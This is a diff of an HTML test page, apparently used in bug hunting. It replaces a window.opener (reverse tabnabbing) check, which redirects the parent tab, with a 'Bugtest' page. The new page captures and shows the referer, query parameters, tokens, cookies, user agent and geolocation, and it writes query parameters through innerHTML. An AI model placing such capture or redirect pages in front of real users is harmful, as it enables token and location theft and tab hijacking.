@@ -1,30 +1,69 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>Opener Test</title>
-    <script>
-        // Wait for page to load
-        window.onload = function() {
-            // Check if window.opener exists
-            if (window.opener) {
-                document.getElementById('result').innerText = "window.opener exists! Vulnerability confirmed.";
-                
-                // Display opener info (don't actually redirect in testing)
-                document.getElementById('openerInfo').innerText = 
-                    "opener URL: " + window.opener.location.href + 
-                    "\nCould redirect the parent window if this were malicious.";
-                
-                // Uncomment to test actual redirection (use with caution)
-                window.opener.location = "https://example.com/";
-            } else {
-                document.getElementById('result').innerText = "window.opener is null. The site is protected.";
-            }
-        }
-    </script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Bug Test - Capturing All Data</title>
 </head>
 <body>
-    <h1>Window Opener Test</h1>
-    <div id="result">Checking...</div>
-    <pre id="openerInfo"></pre>
+    <h1>Bugtest Page - Capturing Leaked Information</h1>
+
+    <h2>Captured Information:</h2>
+
+    <p><strong>Referer Header:</strong></p>
+    <p id="referer"></p>
+
+    <p><strong>Query Parameters:</strong></p>
+    <p id="queryParams"></p>
+
+    <p><strong>Token:</strong></p>
+    <p id="token"></p>
+
+    <p><strong>Cookies:</strong></p>
+    <p id="cookies"></p>
+
+    <p><strong>User-Agent:</strong></p>
+    <p id="userAgent"></p>
+
+    <p><strong>Geolocation (if granted):</strong></p>
+    <p id="geolocation"></p>
+
+    <script>
+        // Capturing Referer Header
+        const referer = document.referrer;
+        document.getElementById("referer").textContent = referer ? referer : 'No referer header found.';
+
+        // Capturing Query Parameters
+        const urlParams = new URLSearchParams(window.location.search);
+        let queryParams = '';
+        urlParams.forEach((value, key) => {
+            queryParams += `${key}: ${value} <br>`;
+        });
+        document.getElementById("queryParams").innerHTML = queryParams ? queryParams : 'No query parameters found.';
+
+        // Capturing Token
+        const token = urlParams.get('token');
+        document.getElementById("token").textContent = token ? token : 'No token found.';
+
+        // Capturing Cookies
+        const cookies = document.cookie;
+        document.getElementById("cookies").textContent = cookies ? cookies : 'No cookies found.';
+
+        // Capturing User-Agent
+        const userAgent = navigator.userAgent;
+        document.getElementById("userAgent").textContent = userAgent;
+
+        // Capturing Geolocation if permission granted
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(function(position) {
+                const location = `Latitude: ${position.coords.latitude}, Longitude: ${position.coords.longitude}`;
+                document.getElementById("geolocation").textContent = location;
+            }, function(error) {
+                document.getElementById("geolocation").textContent = 'Geolocation access denied or unavailable.';
+            });
+        } else {
+            document.getElementById("geolocation").textContent = 'Geolocation is not supported by this browser.';
+        }
+    </script>
 </body>
 </html>
